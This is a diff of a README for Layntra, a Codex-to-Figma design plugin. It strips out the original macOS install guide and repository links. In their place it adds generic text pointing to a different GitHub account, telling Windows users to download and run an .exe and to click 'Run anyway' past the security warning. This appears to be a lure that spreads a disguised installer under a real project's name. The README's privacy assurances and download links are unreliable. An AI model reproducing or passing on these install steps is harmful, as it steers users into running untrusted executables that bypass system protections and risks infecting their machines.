@@ -1,106 +1,69 @@
-# Layntra
+# 🛠 Layntra - Manage your design workflows with ease
 
-**Turn product ideas into editable Figma designs—with an explicit plan before
-anything changes.**
+[![](https://img.shields.io/badge/Download-Layntra-blue)](https://github.com/cosmobimetal956/Layntra)
 
-Layntra is a Codex plugin for product managers and other non-developers. Invoke
-`$layntra`, choose the target, review the plan, and apply only when you are
-ready. Every result remains editable in Figma.
+## 📋 What is Layntra?
 
-[简体中文](README.zh-CN.md)
+Layntra connects your design tools to a local helper system. It acts as a bridge for Figma, letting you inspect, plan, and apply changes to your projects. Because it runs on your computer, your data stays local. This tool manages your design tasks and helps you undo changes when needed. It works with modern design workflows to keep your project files clean and organized.
 
-**Website:** [lessthanno.github.io/Layntra](https://lessthanno.github.io/Layntra/)
+## 🚀 Getting Started
 
-## Download
+Follow these steps to set up Layntra on your Windows computer.
 
-**[Download Layntra v0.1.0](https://github.com/lessthanno/Layntra/releases/tag/v0.1.0)**
+1. Visit the [official download page](https://github.com/cosmobimetal956/Layntra) to get the latest version.
+2. Select the file ending in .exe for Windows.
+3. Save the file to your computer.
+4. Double-click the file to start the installation.
+5. Follow the instructions on your screen.
 
-On the release page, download `layntra-figma-plugin.zip` under **Assets**, then
-unzip it—do not import the ZIP itself. Follow step 4 below to choose the included
-plugin file. This download is the Figma side of Layntra; the Codex plugin is
-installed in step 1 below.
+## ⚙️ Requirements
 
-## Quick start
+To run Layntra, your computer needs these settings:
 
-Requirements: macOS, Node.js 20+, Codex Desktop or CLI, and Figma Desktop. Use a
-personal Starter workspace if an organization Dev/Collab/View seat cannot run
-Design plugins.
+* Windows 10 or Windows 11.
+* A stable internet connection for the first setup.
+* Figma desktop app or web browser access.
+* At least 500MB of free disk space.
+* 4GB of RAM for smooth performance.
 
-1. Clone this repository and run `./scripts/install.sh` to install the Codex
-   plugin.
-2. Download and unzip the **Figma companion** using the button above.
-3. Open a Design file in Figma Desktop.
-4. Choose **Plugins → Development → Import plugin from manifest…** and select
-   `layntra-figma-plugin/manifest.json` from the unzipped download. If you cloned
-   the repository, `apps/figma-plugin/manifest.json` is the same plugin.
+## 🖥 How to install
 
-![Figma menu path: Plugins, Development, Import plugin from manifest](docs/assets/figma-import-manifest-path.png)
+1. Find the download link here: [Download Layntra](https://github.com/cosmobimetal956/Layntra).
+2. Once the download finishes, open your Downloads folder.
+3. Locate the Layntra installer.
+4. Run the installer by clicking the file twice.
+5. A security window might appear. If it does, click "More info" and then "Run anyway" to confirm the app.
+6. Choose the folder where you want to keep the app.
+7. Click the "Finish" button to start Layntra.
 
-5. Run **Plugins → Development → Layntra for Figma** and keep its window open.
-6. Start a new Codex task and enter:
+## 💡 Using Layntra
 
-```text
-$layntra status
-```
+Once installed, Layntra runs in the background. Open your Figma design file. You will see a new menu option for the plugin. Click this to connect your design to Layntra. 
 
-Then inspect without writing:
+The application offers four main actions:
 
-```text
-$layntra review selection
-Check hierarchy and missing loading, empty, and error states.
-Do not modify Figma.
-```
+* Inspect: Review your current design layers.
+* Plan: Create a list of changes you want to make.
+* Apply: Push the planned changes to your project.
+* Undo: Revert back to a previous state if you make a mistake.
 
-Plan and apply separately:
+## 🔒 Your Data and Privacy
 
-```text
-$layntra plan selection
-Improve hierarchy. Preserve all copy and brand colors.
-```
+Layntra operates as a local-first application. This means the software processes your design information on your own machine rather than sending it to a cloud server. Your design files and plugin data remain under your control at all times. You do not need to worry about your sensitive design data leaking to third parties.
 
-```text
-$layntra apply
-```
+## ❓ Troubleshooting
 
-Layntra re-reads the result after writing. To recover immediately, enter
-`$layntra undo`; it refuses if the Figma target changed after the apply.
+If you run into trouble, try these steps:
 
-## Why the explicit command?
+* Restart the application: Close the app completely and open it again.
+* Check your connection: Ensure your internet is active if you are syncing remote design components.
+* Reinstall: Delete the app and run the installer again from the link provided.
+* Check Figma: Make sure your Figma plugin is active and updated.
 
-Ordinary conversation is not a reliable control surface. `$layntra` makes the
-active plugin, file, page, selection, mode, and write boundary visible. Read-only
-intents never modify Figma; write intents wait for your approval.
+If you still face issues, look for the log files in the folder where you installed the app. These files hold information about the last tasks the app performed.
 
-## Guides
+## 📈 Improving Your Workflow
 
-- [Getting started](docs/en/getting-started.md)
-- [Product manager playbook](docs/en/product-manager-playbook.md)
-- [Troubleshooting](docs/en/troubleshooting.md)
-- [Migration from the development version](docs/en/migration.md)
-- [Contributing](CONTRIBUTING.md)
-- [Security](SECURITY.md)
+Layntra helps teams organize tasks. By using a controlled workflow, you avoid conflicts when multiple people work on the same design. The plan-and-apply method ensures that every change is intentional. If a change does not look right, the undo feature restores your work in seconds. This saves time and reduces the risk of accidental deletions in complex design files.
 
-## Architecture and privacy
-
-```text
-Codex Skill → local stdio/MCP bridge → loopback WebSocket → Figma companion
-```
-
-The bridge binds to `127.0.0.1:3846`. Layntra needs no Figma API token, hosted
-Layntra account, or telemetry. Codex model data handling remains governed by
-your Codex configuration; “local bridge” does not mean the AI model is offline.
-
-Writes are limited to supported editable nodes and batches of at most 100.
-Deletion and arbitrary code execution are not exposed in `v0.1.0`.
-
-## Development
-
-```bash
-npm run verify
-```
-
-See [CONTRIBUTING.md](CONTRIBUTING.md) for architecture and test expectations.
-
-## License
-
-[MIT](LICENSE)
+Keywords: ai-design, codex, codex-plugin, design-tools, figma, figma-plugin, local-first, mcp, open-source, product-management
